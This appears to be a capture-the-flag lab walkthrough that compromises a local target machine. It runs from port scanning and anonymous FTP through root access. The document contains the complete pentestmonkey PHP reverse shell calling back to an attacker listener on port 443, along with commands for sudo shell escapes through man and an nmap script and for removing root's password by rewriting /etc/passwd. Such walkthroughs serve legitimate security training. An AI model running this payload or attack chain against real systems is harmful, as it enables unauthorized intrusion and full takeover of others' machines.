# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
```

Server is reachable
# Ports scanning
```sh
sudo nmap -sS -sV -sC -p- --min-rate 5000 172.17.0.2
```

Two open ports discovered
- 21 running FTP (vsftpd 3.0.5)
- 80 running a web service in Apache
# FTP enumeration
## Anonymous login
``` sh
ftp 172.17.0.2
```

Anonymous login was successful

With FTP access we could try upload a payload with a in order to get a web reverse shell
# Web enumeration
## Dir fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Found the directory upload
This could be the way to execute the payload

# Reverse shell
## Payload
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

To upload this payload we are going to use FTP
```sh
ftp> put payload.php
```

Only thing left is to start listening on port 443 and execute the payload in the web
```sh
sudo nc -lvnp 443
```
# Privilege escalation
## www-data
### Sudo
```sh
sudo -l
```

With www-data we can run /usr/bin/man as pingu no password needed
### Lateral movement
```sh
sudo -u pingu /usr/bin/man man
```

Invoking a shell we'll be pingu
```man
!/bin/bash
```
## pingu
### Sudo
```sh
sudo -l
```

With pingu we can run /usr/bin/nmap as gladys no password needed
### Lateral movement
To invoke a shell as gladys with nmap we will excecute a script
```sh
echo 'os.execute("/bin/sh <&1 >&1 2>&1")' > /tmp/shell.nse
sudo -u gladys /usr/bin/nmap --script=/tmp/shell.nse
```
## gladys
### Sudo
``` sh
sudo -l
```

With gladys we can run /usr/bin/chown as root no password needed
chown is a tool to change ownership
This is useful to use in /etc/passwd

```sh
sudo -u root /usr/bin/chown 1002:1002 /etc/passwd
```

```sh
chmod 777 /etc/passwd
```

```sh
sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd.new
```

```sh
cat /tmp/passwd.new > /etc/passwd
```

Now root needs no password
# Root
```sh
su -
# whoami
root
```